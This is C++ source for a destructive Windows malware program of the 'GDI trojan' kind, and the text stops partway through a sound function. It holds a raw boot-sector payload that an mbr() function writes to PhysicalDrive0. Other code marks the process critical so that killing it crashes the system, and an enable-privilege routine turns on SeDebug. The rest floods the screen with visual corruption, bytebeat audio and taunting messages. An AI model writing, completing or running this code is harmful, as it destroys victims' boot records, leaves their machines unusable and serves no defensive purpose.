#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef struct {
	FLOAT h, s, l;
} HSL;

namespace Colors {
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0);
	if (clr == 1) return RGB(0, 255, 0);
	if (clr == 2) return RGB(0, 0, 255);
	if (clr == 3) return RGB(255, 0, 255);
	if (clr == 4) return RGB(255, 255, 0);
}

const unsigned char MasterBootRecord[] = {
	0x31, 0xDB, 0x8E, 0xDB, 0xBC, 0x00, 0x7C, 0xDB, 0xE3, 0xB8, 0x13, 0x00,
	0xCD, 0x10, 0x31, 0xDB, 0x31, 0xC0, 0x8E, 0xC3, 0xBF, 0x00, 0x7E, 0xB9,
	0x00, 0x02, 0xF3, 0xAA, 0xFF, 0x06, 0x20, 0x7E, 0xD9, 0x06, 0x00, 0x7E,
	0xD8, 0x06, 0xD9, 0x7D, 0xD9, 0x16, 0x00, 0x7E, 0xD9, 0xFB, 0xD9, 0x1E,
	0x08, 0x7E, 0xD9, 0x1E, 0x04, 0x7E, 0xD9, 0x06, 0xD5, 0x7D, 0xD8, 0x06,
	0xD9, 0x7D, 0xD9, 0x16, 0xD5, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0x10, 0x7E,
	0xD9, 0x1E, 0x0C, 0x7E, 0xBB, 0x00, 0x30, 0xB0, 0x7F, 0x8E, 0xC3, 0x31,
	0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0x30, 0xC0, 0xBB, 0x00, 0x20, 0x8E,
	0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0xBB, 0xCF, 0xFF, 0xD9,
	0x06, 0x00, 0x7E, 0xD9, 0xFE, 0xD8, 0x0E, 0xDD, 0x7D, 0xDF, 0x1E, 0x22,
	0x7E, 0x8B, 0x0E, 0x22, 0x7E, 0x83, 0xC1, 0x32, 0xBD, 0x63, 0x00, 0xB8,
	0xCF, 0xFF, 0xBA, 0x63, 0x00, 0xBE, 0x04, 0x00, 0xE8, 0x3D, 0x00, 0x87,
	0xD9, 0xF7, 0xDB, 0x4E, 0x75, 0xF6, 0xBE, 0x05, 0x00, 0x91, 0xF7, 0xD9,
	0xE8, 0x2D, 0x00, 0xBE, 0x06, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x23,
	0x00, 0x91, 0xF7, 0xD9, 0x40, 0x4A, 0x75, 0xD9, 0x43, 0x4D, 0x75, 0xCF,
	0x1E, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0x31,
	0xF6, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xA4, 0x1F, 0xE9, 0x50, 0xFF,
	0x66, 0x60, 0xA3, 0x14, 0x7E, 0x89, 0x1E, 0x18, 0x7E, 0x89, 0x0E, 0x1C,
	0x7E, 0xDF, 0x06, 0x14, 0x7E, 0xD9, 0x1E, 0x14, 0x7E, 0xDF, 0x06, 0x18,
	0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDF, 0x06, 0x1C, 0x7E, 0xD9, 0x1E, 0x1C,
	0x7E, 0xD9, 0x06, 0x04, 0x7E, 0xD9, 0x06, 0x08, 0x7E, 0xD9, 0x06, 0x18,
	0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9,
	0x06, 0x18, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE,
	0xC1, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDD, 0xD8, 0xDD,
	0xD8, 0xD9, 0x06, 0x0C, 0x7E, 0xD9, 0x06, 0x10, 0x7E, 0xD9, 0x06, 0x14,
	0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9,
	0x06, 0x14, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE,
	0xE9, 0xD9, 0xC0, 0xD8, 0x0E, 0xCD, 0x7D, 0xDF, 0x1E, 0x1C, 0x7E, 0xD8,
	0x06, 0xC9, 0x7D, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xF1, 0xD8, 0x0E, 0xD1,
	0x7D, 0xDF, 0x1E, 0x18, 0x7E, 0xDE, 0xF9, 0xD8, 0x0E, 0xD1, 0x7D, 0xDF,
	0x1E, 0x14, 0x7E, 0xDD, 0xD8, 0xDD, 0xD8, 0x8B, 0x3E, 0x20, 0x7E, 0xC1,
	0xEF, 0x04, 0x01, 0xFE, 0x83, 0xE6, 0x0F, 0x8A, 0x9C, 0xE1, 0x7D, 0x8B,
	0x36, 0x14, 0x7E, 0x8B, 0x3E, 0x18, 0x7E, 0x81, 0xC6, 0xA0, 0x00, 0x83,
	0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2C, 0x85, 0xF6, 0x78, 0x28,
	0x81, 0xFF, 0xC8, 0x00, 0x7D, 0x22, 0x85, 0xFF, 0x78, 0x1E, 0x69, 0xFF,
	0x40, 0x01, 0x01, 0xF7, 0xB9, 0x00, 0x30, 0xBE, 0x00, 0x20, 0xA0, 0x1C,
	0x7E, 0x8E, 0xC1, 0x26, 0x3A, 0x05, 0x7D, 0x08, 0x26, 0x88, 0x05, 0x8E,
	0xC6, 0x26, 0x88, 0x1D, 0x8E, 0xC6, 0x66, 0x61, 0xC3, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20,
	0x43, 0x00, 0x00, 0x00, 0x40, 0x0A, 0xD7, 0xA3, 0x3B, 0x00, 0x00, 0x70,
	0x41, 0x20, 0x22, 0x23, 0x25, 0x26, 0x27, 0x28, 0x2A, 0x2C, 0x2D, 0x2F,
	0x30, 0x32, 0x34, 0x36, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical() {
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL) {
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI rndblt(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RndRGB());
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		ReleaseDC(0, hdc);
		DeleteObject(brush);
		Sleep(10);
	}
}

DWORD WINAPI stretch(LPVOID lpParam) {
	double angle = 0.0;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int xadd = (int)(sin(angle) * 50.0);
		int yadd = (int)(cos(angle) * 50.0);
		SetStretchBltMode(hdc, 3);
		StretchBlt(hdc, xadd / 2, yadd / 2, w - xadd, h - yadd, hdc, 0, 0, w, h, SRCCOPY);
		angle = angle + 0.1963495408493621;
		DeleteObject(hdc);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI white(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCPAINT);
		ReleaseDC(0, hdc);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI shader1(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x & y));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI laplace(LPVOID lpParam) { //credits to camellia-y7x
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; y += 100) {
			for (int x = 0; x < w; x += 100) {
				StretchBlt(hcdc, x, y, 100, 100, hcdc, x, y, 105, 105, SRCCOPY);
			}
		}
		BLENDFUNCTION blur;
		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 50;
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
	return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			if (i % h && rand() % 110)
				v = rand() % 100;
			*((BYTE*)data + 4 * i + v) -= 5;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI shader3(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;
				FLOAT fx = (tan(x ^ y) + (i + i * 10));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI shader4(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				FLOAT fx = i * x * y;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, -20, 0, w, h + 20, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI piez(LPVOID lpParam) {
	int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
	int incrementation = 10;
	int x = 10, y = 10;
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		x += incrementation * sx;
		y += incrementation * sy;
		HBRUSH hbsh = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, hbsh);
		Pie(hdc, x, y, x + 100, y + 100, rand() % w, rand() % h, 30, 30);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI textout(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		SetBkMode(hdc, 0);
		HFONT hfnt = CreateFontA(43, 32, 0, 0, FW_THIN, 1, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
		SelectObject(hdc, hfnt);
		LPCSTR things[] = {
			"lithium", "N17Pro3426", "element 3", "don't try to repair your computer!",
			"HAHAHAHA!", "do you like this feeling?", "you can't do anything about it!",
			"just give up, there's no hope!", "what were you thinking?", "it's all your fault!",
			"still using this computer?"
		};
		int thing = rand() % _countof(things);
		SetTextColor(hdc, Hue(239));
		TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
		DeleteObject(hfnt);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}

DWORD WINAPI shader5(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (true) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ y));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 6 & t >> 3 & 254) * t >> ((t >> 12) & 2) & 127);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t | t * (t >> 8 | t >> 7)) + 64;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ 69) * t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t / ((t >> 9 & t >> 5) + 1) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 1) * (t ^ t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * 287 / 256 & t >> 11 & 31));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 12) * 64 + (t >> 1) * (t >> 10) * (t >> 11) * 48 >> ((t >> 16 | t >> 17) & 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
